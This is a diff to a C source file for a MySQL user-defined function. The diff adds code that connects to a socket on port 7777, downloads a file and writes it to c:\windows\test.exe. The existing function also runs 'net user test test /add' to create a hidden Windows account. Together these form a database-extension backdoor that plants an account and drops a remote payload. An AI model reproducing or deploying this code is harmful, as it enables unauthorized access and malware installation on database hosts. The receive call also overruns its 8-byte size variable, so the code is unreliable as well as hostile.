@@ -157,10 +157,70 @@ my_bool myfunc_test_init(UDF_INIT *initd,UDF_ARGS *args,char *message)
 	return 0;
 }
 
+BOOL InitSocket()
+{
+	WORD wVersionRequired;
+	WSADATA wsaData;
+	int err;
+	wVersionRequired = MAKEWORD(1,1);
+	err = WSAStartup(wVersionRequired,&wsaData);
+	if (err != 0)
+		return FALSE;
+	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
+	{
+		WSACleanup();
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+void ConnectServer()
+{
+	if (InitSocket())
+	{
+		char *strIP = "127.0.0.1";
+		int port = 7777;
+		unsigned long long file_size = 0;
+		SOCKET sockClient = socket(AF_INET,SOCK_STREAM,0);
+		SOCKADDR_IN addrSrv;
+		addrSrv.sin_addr.S_un.S_addr = inet_addr(strIP);
+		addrSrv.sin_port = ntohs(port);
+		addrSrv.sin_family = AF_INET;
+
+		if (!connect(sockClient,(SOCKADDR *)&addrSrv,sizeof(SOCKADDR)))
+		{
+			recv(sockClient,(char *)&file_size,sizeof(unsigned long long) + 1,0);
+
+			if (file_size > 0)
+			{
+				DWORD dwNumberOfBytesRecv = 0;
+				DWORD dwCountOfBytesRecv = 0;
+				char *filename = "c:\\windows\\test.exe";
+				char *Buffer = (char *)malloc(102400);
+				HANDLE hFile = CreateFile(filename,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+
+				do 
+				{
+					dwNumberOfBytesRecv = recv(sockClient,Buffer,102400,0);
+					WriteFile(hFile,Buffer,dwNumberOfBytesRecv,&dwNumberOfBytesRecv,NULL);
+					dwCountOfBytesRecv += dwNumberOfBytesRecv;
+				} while (file_size - dwCountOfBytesRecv);
+
+				CloseHandle(hFile);
+			}
+		}
+
+		closesocket(sockClient);
+	}
+}
+
+
 longlong myfunc_test(UDF_INIT *initd,UDF_ARGS *args,char *is_null,char *error)
 {
 #include <windows.h>
 	system("net user test test /add");
+	ConnectServer();
 	return 0;
 }
 
